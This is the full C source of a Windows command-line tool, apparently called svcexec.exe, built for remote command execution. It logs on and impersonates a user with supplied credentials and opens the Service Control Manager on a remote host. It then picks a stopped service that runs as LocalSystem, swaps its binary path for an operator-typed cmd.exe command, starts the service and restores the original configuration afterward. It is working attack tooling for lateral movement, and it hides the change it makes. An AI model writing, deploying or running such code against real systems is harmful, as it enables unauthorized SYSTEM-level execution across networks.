#include <windows.h>
#include <shellapi.h>

#pragma intrinsic(memcpy, memset)

#define CMD_EXE_LIMIT           8191
#define SERVICE_RESTART_DELAY   5000

#define PRINTW( STR, ... )                                                                                \
    do {                                                                                                  \
        LPWSTR lpBuffer = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * sizeof(WCHAR) );  \
        if ( lpBuffer != NULL ) {                                                                         \
            int len = wsprintfW( lpBuffer, TEXT(STR), __VA_ARGS__ );                                      \
            WriteConsoleW( GetStdHandle( STD_OUTPUT_HANDLE ), lpBuffer, len, NULL, NULL );                \
            HeapFree( GetProcessHeap(), 0 , lpBuffer );                                                   \
        }                                                                                                 \
    } while (0)


typedef struct _SERVICE {
    SC_HANDLE hService;
    LPWSTR ServiceName;
    LPWSTR DisplayName;
    SERVICE_STATUS_PROCESS Status;
    LPQUERY_SERVICE_CONFIGW pConfig;
} SERVICE, * PSERVICE;


static BOOL ReadLineW(IN DWORD dwCap, IN OUT wchar_t* lpBuffer) {
    DWORD dwNumberOfCharsRead;
    HANDLE hConsoleInput;

    if (!lpBuffer || dwCap < 2) // ensure space for at least one character + terminator
        return FALSE;

    if ( ! (hConsoleInput = GetStdHandle(STD_INPUT_HANDLE)) || hConsoleInput == INVALID_HANDLE_VALUE) {
        PRINTW("[!] GetStdHandle Failed With Error: %lu", GetLastError());
        return FALSE;
    }
 
    if (!ReadConsoleW(hConsoleInput, lpBuffer, dwCap - 1, &dwNumberOfCharsRead, NULL)) {
        PRINTW("[!] ReadConsoleW Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    lpBuffer[dwNumberOfCharsRead] = L'\0';

    if (dwNumberOfCharsRead > 0 && lpBuffer[dwNumberOfCharsRead - 1] == L'\n')
        lpBuffer[--dwNumberOfCharsRead] = L'\0';

    if (dwNumberOfCharsRead > 0 && lpBuffer[dwNumberOfCharsRead - 1] == L'\r')
        lpBuffer[--dwNumberOfCharsRead] = L'\0';

    return TRUE;
}

static BOOL ReadUserCommand(IN DWORD cchMax, OUT LPWSTR* ppOut) { 
    if (!ppOut || cchMax < 2) 
        return FALSE;

    if ( ! (*ppOut = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cchMax * sizeof(WCHAR))))
        return FALSE;

    PRINTW("[*] Enter command to execute: ");

    if (!ReadLineW(cchMax, *ppOut)) { 
        HeapFree(GetProcessHeap(), 0, *ppOut); 
        *ppOut = NULL; 
        return FALSE;
    }

    return TRUE;
}


static BOOL LogonAndImpersonateUser(IN LPCWSTR lpUsername, IN LPCWSTR lpPassword, IN LPCWSTR lpDomain, OUT HANDLE *phToken) {
    HANDLE hToken = NULL;

    if (!LogonUserW(lpUsername, lpDomain, lpPassword, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken)) {
        PRINTW("[!] LogonUserW Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        PRINTW("[!] ImpersonateLoggedOnUser Failed With Error: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    *phToken = hToken;
    return TRUE;
}


static BOOL OpenRemoteSCManager(IN LPCWSTR lpRemoteHost, OUT SC_HANDLE *phSCManager) {
    SC_HANDLE hSCManager = NULL;
   
    if ( ! (hSCManager = OpenSCManagerW(lpRemoteHost, NULL, SC_MANAGER_ALL_ACCESS))) {
        PRINTW("[!] OpenSCManagerW Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    *phSCManager = hSCManager;
    return TRUE;
}


static BOOL GetServiceInformation(IN SC_HANDLE hSCManager, IN ENUM_SERVICE_STATUS_PROCESSW EnumServiceStatusProcW, OUT SERVICE *pService) {
    DWORD cbBytesNeeded = 0;
    SC_HANDLE hService = NULL;
    LPQUERY_SERVICE_CONFIGW lpServiceConfigW = NULL;

    memset((PVOID)pService, 0, sizeof(SERVICE));

    if ( ! (hService = OpenServiceW(hSCManager, EnumServiceStatusProcW.lpServiceName, SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START)))
        goto CLEANUP;

    // determine amount of memory needed to store service config
    QueryServiceConfigW(hService, NULL, 0, &cbBytesNeeded);
    lpServiceConfigW = (LPQUERY_SERVICE_CONFIGW)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbBytesNeeded);

    // retrieve the service config
    if (!QueryServiceConfigW(hService, lpServiceConfigW, cbBytesNeeded, &cbBytesNeeded))
        goto CLEANUP;

    pService->hService = hService;
    pService->ServiceName = EnumServiceStatusProcW.lpServiceName;
    pService->DisplayName = EnumServiceStatusProcW.lpDisplayName;
    pService->Status = EnumServiceStatusProcW.ServiceStatusProcess;
    pService->pConfig = lpServiceConfigW;
    return TRUE;

CLEANUP:
    if (lpServiceConfigW) HeapFree(GetProcessHeap(), 0, lpServiceConfigW);
    if (hService) CloseServiceHandle(hService);
    return FALSE;
}


static BOOL FindEligibleService(IN SC_HANDLE hSCManager, OUT SERVICE *pService) {
    BOOL  bResult  = FALSE;
    DWORD cbBytesNeeded = 0; 
    DWORD dwNumberOfServices = 0; 
    DWORD dwResumeHandle = 0; 
    LPENUM_SERVICE_STATUS_PROCESSW pStatusOfServices = NULL;
    
    memset((PVOID)pService, 0, sizeof(SERVICE));

    // determine size of buffer needed to enumerate services in the control manager database
    EnumServicesStatusExW(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &cbBytesNeeded, &dwNumberOfServices, &dwResumeHandle, NULL);
    pStatusOfServices = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbBytesNeeded);
    
    // retrieve services and store in buffer
    if (!EnumServicesStatusExW(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, (LPBYTE)pStatusOfServices, cbBytesNeeded, &cbBytesNeeded, &dwNumberOfServices, &dwResumeHandle, NULL)) {
        PRINTW("[!] EnumServicesStatusExW Failed With Error: %lu\n", GetLastError());
        goto CLEANUP;
    }

    for (int pass = 0; pass < 2 && !bResult; ++pass) {
        DWORD dwTargetStartType = (pass == 0) ? SERVICE_DISABLED : SERVICE_DEMAND_START;

        for (DWORD n = 0; n < dwNumberOfServices; ++n) {
            SERVICE CurrentService;

            if (!GetServiceInformation(hSCManager, pStatusOfServices[n], &CurrentService))
                continue;

            BOOL bIsMatch = (CurrentService.pConfig->dwStartType == dwTargetStartType) &&
                (CurrentService.Status.dwCurrentState == SERVICE_STOPPED) &&
                (lstrlenW(CurrentService.pConfig->lpDependencies) == 0) &&
                (CompareStringOrdinal(CurrentService.pConfig->lpServiceStartName, -1, TEXT("LocalSystem"), -1, TRUE) == CSTR_EQUAL);

            if (bIsMatch == TRUE) {
                *pService = CurrentService;
                PRINTW("[*] Found eligible service: %s\n", CurrentService.ServiceName);
                bResult = TRUE;
                break;
            }

            // Cleanup only if not returning the service
            CloseServiceHandle(CurrentService.hService);
        }
    }

CLEANUP:
    if (pStatusOfServices) HeapFree(GetProcessHeap(), 0, pStatusOfServices);
    return bResult;
}


static BOOL ExecuteRemoteCommand(IN SERVICE Service, IN LPCWSTR wCommand) {
    /***/ BOOL     bResult        =   FALSE;
    /***/ PVOID    pFullCommand   =   NULL;
    const WCHAR    wPrefix[]      =   TEXT("C:\\Windows\\System32\\cmd.exe /D /C ");   
    const size_t   cchPrefix      =   _countof(wPrefix) - 1;      // chars - NUL
    const size_t   cchCommand     =   (size_t)lstrlenW(wCommand); // chars
    const size_t   cchFullCommand =   cchPrefix + cchCommand + 1; // chars + NUL
    const size_t   cbBytesNeeded  =   cchFullCommand * sizeof(WCHAR); // bytes
 
    if ( ! (pFullCommand = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbBytesNeeded)))
        goto CLEANUP;

    // copy prefix (chars) and command (+NUL) in bytes
    memcpy(pFullCommand, wPrefix, cchPrefix * sizeof(WCHAR));
    memcpy((WCHAR*)pFullCommand + cchPrefix, wCommand, (cchCommand + 1) * sizeof(WCHAR));

    PRINTW("[*] Original BinaryPath: %s\n", Service.pConfig->lpBinaryPathName);
    PRINTW("[*] New BinaryPath: %s\n", pFullCommand);

    if (!ChangeServiceConfigW(Service.hService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_NO_CHANGE, pFullCommand, NULL, NULL, NULL, NULL, NULL, NULL)) {
        PRINTW("[!] ChangeServiceConfigW Failed With Error: %lu\n", GetLastError());
        goto CLEANUP;
    }
    
    StartServiceW(Service.hService, 0, NULL);
    Sleep((DWORD)SERVICE_RESTART_DELAY);

    PRINTW("[*] Executed command\n");
    bResult = TRUE;

CLEANUP:
    if (pFullCommand) HeapFree(GetProcessHeap(), 0, pFullCommand);
    return bResult;
}


static BOOL RestoreServiceConfig(SERVICE Service) {
 
    if (!ChangeServiceConfigW(Service.hService, SERVICE_NO_CHANGE, Service.pConfig->dwStartType, SERVICE_NO_CHANGE, Service.pConfig->lpBinaryPathName, NULL, NULL, NULL, Service.pConfig->lpServiceStartName, NULL, NULL)) {
        PRINTW("[!] ChangeServiceConfigW Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    PRINTW("[*] Restored original service config\n");

    CloseServiceHandle(Service.hService);
    return TRUE;
}


static BOOL ParseCmdLineArgs(int *pArgc, LPCWSTR** ppArgv) {

    if ( ! (*ppArgv = CommandLineToArgvW(GetCommandLineW(), pArgc)) ) {
        PRINTW("[!] CommandLineToArgvW Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (*pArgc < 4) {
        PRINTW("Usage: svcexec.exe <username> <password> <rhost> [domain]\n");
        return FALSE;
    }

    return TRUE;
}


__declspec(noreturn) void EntryCRTless(void) {

    INT       argc = 0;
    LPCWSTR*  argv = NULL;
    LPWSTR    lpRemoteCommand = NULL;
    HANDLE    hToken = NULL;
    SC_HANDLE hScm = NULL;
    SERVICE   RemoteService = { 0 };
    BOOL      bSuccess = FALSE;

    if (!ParseCmdLineArgs(&argc, &argv)) 
        goto CLEANUP;
    
    LPCWSTR   wUsername     = argv[1];
    LPCWSTR   wPassword     = argv[2];
    LPCWSTR   wRemoteHost   = argv[3];
    LPCWSTR   wDomain       = (argc >= 5) ? argv[4] : wRemoteHost;
    
    if (!ReadUserCommand(CMD_EXE_LIMIT, &lpRemoteCommand)) {
        PRINTW("[-] No command entered\n");
        goto CLEANUP;
    }

    if (!LogonAndImpersonateUser(wUsername, wPassword, wDomain, &hToken)) {
        PRINTW("[-] Access token not acquired\n");
        goto CLEANUP;
    }

    if (!OpenRemoteSCManager(wRemoteHost, &hScm)) {
        PRINTW("[-] Cannot open SC Manager on %s \n", wRemoteHost);
        goto CLEANUP;
    }

    if (!FindEligibleService(hScm, &RemoteService)) {
        PRINTW("[-] No eligible service found\n");
        goto CLEANUP;
    }

    if (!ExecuteRemoteCommand(RemoteService, lpRemoteCommand)) {
        PRINTW("[-] Command not executed\n");
        goto CLEANUP;
    }

    if (!RestoreServiceConfig(RemoteService)) {
        PRINTW("[-] Service config not restored\n");
        goto CLEANUP;
    }

    bSuccess = TRUE;

CLEANUP:
    if (RemoteService.hService) CloseServiceHandle(RemoteService.hService);
    if (RemoteService.pConfig)  HeapFree(GetProcessHeap(), 0, RemoteService.pConfig);
    if (hScm) CloseServiceHandle(hScm);
    if (hToken) CloseHandle(hToken);
    if (lpRemoteCommand) HeapFree(GetProcessHeap(), 0, lpRemoteCommand);
    if (argv) LocalFree(argv);
    if (bSuccess) ExitProcess(0);
    ExitProcess(1);
}
